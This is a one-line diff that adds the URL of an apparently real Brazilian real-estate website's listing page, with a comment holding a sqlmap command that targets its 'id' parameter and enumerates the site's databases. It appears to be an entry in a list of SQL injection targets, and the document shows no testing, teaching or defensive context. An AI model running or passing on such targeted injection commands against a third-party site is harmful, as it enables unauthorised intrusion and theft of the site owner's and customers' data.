@@ -1,0 +1,1 @@
+https://www.britoimoveisrs.com.br/detalhes.php?id=1494 (GET)  # sqlmap.py -u https://www.britoimoveisrs.com.br/detalhes.php?id=1494 --dbs --threads 5 -v3
